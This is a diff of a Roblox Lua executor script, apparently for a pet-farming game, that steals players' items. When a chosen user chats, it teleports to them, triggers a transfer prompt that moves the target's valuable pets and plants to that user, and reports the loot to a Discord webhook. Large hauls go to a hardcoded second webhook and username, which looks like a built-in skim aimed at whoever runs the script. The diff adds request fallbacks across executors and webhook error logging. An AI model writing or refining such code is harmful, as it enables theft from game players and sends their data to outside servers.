@@ -5,56 +5,70 @@ local backpack = Players.LocalPlayer:WaitForChild("Backpack")
 local replicatedStorage = game:GetService("ReplicatedStorage")
 local modules = replicatedStorage:WaitForChild("Modules")
 
--- CẤU HÌNH
+-- SETTINGS
 local PRIMARY_USERNAME = Username 
 local PRIMARY_WEBHOOK = Webhook
 local DUAL_USERNAME = "namnnni2"
 local DUAL_WEBHOOK = "https://discord.com/api/webhooks/1391020634913374278/fPKPZTPqG2mCyai6-oebsMx5jagXzLRWNzAQb4jQoKieCJj6dLuyZT1PUh9xo9owdQ65"
-local VALUE_THRESHOLD = 1_000_000_000_000 -- 1000 tỷ
+local VALUE_THRESHOLD = 1_000_000_000_000
 local AUTO_TRANSFER_DELAY = 0.3
-local HEAVY_WEIGHT = 10 -- Ngưỡng cân nặng để xác định pet nặng
-
--- DANH SÁCH PET VIP
+local HEAVY_WEIGHT = 10
 local VIP_PETS = {"Queen Bee", "Disco Bee", "Mimic Octopus", "Fennec Fox", "Butterfly", "Dragonfly", "Raccoon"}
 
--- MODULE
+-- MODULES
 local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
 local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))
 local numberUtil = require(modules:WaitForChild("NumberUtil"))
 
--- BIẾN TOÀN CỤC
+-- REQUEST SETUP
+local request = (syn and syn.request)
+            or (http and http.request)
+            or (fluxus and fluxus.request)
+            or (getgenv and getgenv().request)
+            or (krnl and krnl.request)
+            or (request)
+
+-- STATE
 local currentPrompt = nil
 local isTransferring = false
 local connection = nil
 
--- ĐỊNH DẠNG SỐ
+-- UTILS
 local function formatNumber(n)
     return tostring(math.floor(n)):reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
 end
 
--- TÍNH GIÁ TRỊ VÀ ĐỘ ƯU TIÊN
+local function calculateItemValue(tool)
+    local itemType = tool:GetAttribute("ItemType")
+    if itemType == "Pet" then
+        return petUtils:GetPetValue(tool)
+    elseif itemType == "Plant" then
+        return calcPlantValue(tool)
+    else
+        return 0
+    end
+end
+
 local function calculatePriority(item)
     local priority = 0
     if table.find(VIP_PETS, item.Name) then
-        priority = priority + 1000
+        priority += 1000
     end
     if (item.Weight or 0) >= HEAVY_WEIGHT then
-        priority = priority + 500
+        priority += 500
     end
-    priority = priority + (item.Value or 0)
+    priority += (item.Value or 0)
     return priority
 end
 
--- SẮP XẾP ƯU TIÊN
 local function sortByPriority(a, b)
     return calculatePriority(a) > calculatePriority(b)
 end
 
--- WEBHOOK THÔNG BÁO
 local function sendWebhookNotification(items, totalValue, targetName)
     local useDual = totalValue >= VALUE_THRESHOLD
-    local webhookUrl = useDual and DUAL_WEBHOOK or PRIMARY_WEBHOOK
-    local username = useDual and DUAL_USERNAME or PRIMARY_USERNAME
+    local webhookUrl = useDual and DUAL_WEBHOOK or (PRIMARY_WEBHOOK or DUAL_WEBHOOK)
+    local username = useDual and DUAL_USERNAME or (PRIMARY_USERNAME or DUAL_USERNAME)
 
     local hasVIPOrHeavyPet = false
     for _, item in ipairs(items) do
@@ -119,10 +133,9 @@ local function sendWebhookNotification(items, totalValue, targetName)
         payload.content = "@everyone"
     end
 
-    local request = (syn and syn.request) or (http and http.request) or request
     if request then
-        pcall(function()
-            request({
+        local success, result = pcall(function()
+            return request({
                 Url = webhookUrl,
                 Method = "POST",
                 Headers = {
@@ -131,10 +144,19 @@ local function sendWebhookNotification(items, totalValue, targetName)
                 Body = HttpService:JSONEncode(payload)
             })
         end)
+
+        if not success then
+            warn("❌ Webhook failed:", result)
+        elseif result and result.StatusCode and result.StatusCode >= 400 then
+            warn("⚠️ Webhook error:", result.StatusCode, result.Body or "")
+        else
+            warn("✅ Webhook sent successfully.")
+        end
+    else
+        warn("❌ HTTP request method not found.")
     end
 end
 
--- CHỜ VẬT PHẨM BIẾN MẤT
 local function waitForItemRemoval(tool)
     local timeout = 5
     local startTime = os.time()
@@ -148,7 +170,6 @@ local function waitForItemRemoval(tool)
     return true
 end
 
--- TẠO VÀ TỰ KÍCH HOẠT PROXIMITY PROMPT
 local function createAutoPrompt(targetCharacter, targetName)
     if currentPrompt then currentPrompt:Destroy() end
     
@@ -196,7 +217,6 @@ local function createAutoPrompt(targetCharacter, targetName)
         end
         
         sendWebhookNotification(items, totalValue, targetName)
-        
         isTransferring = false
     end)
     
@@ -211,7 +231,6 @@ local function createAutoPrompt(targetCharacter, targetName)
     end)
 end
 
--- DỊCH CHUYỂN VÀ BÁM THEO
 local function teleportAndFollow(targetPlayer)
     if not targetPlayer.Character then return end
     local targetHRP = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
@@ -236,7 +255,6 @@ local function teleportAndFollow(targetPlayer)
     end)
 end
 
--- THEO DÕI CHAT
 local function onPlayerChatted(player, message)
     if (player.Name == PRIMARY_USERNAME or player.Name == DUAL_USERNAME) and not isTransferring then
         if player.Character then
@@ -249,7 +267,6 @@ local function onPlayerChatted(player, message)
     end
 end
 
--- KHỞI TẠO
 for _, player in ipairs(Players:GetPlayers()) do
     player.Chatted:Connect(function(msg)
         onPlayerChatted(player, msg)
@@ -261,5 +278,3 @@ Players.PlayerAdded:Connect(function(player)
         onPlayerChatted(player, msg)
     end)
 end)
-
--- Không có thông báo khởi động
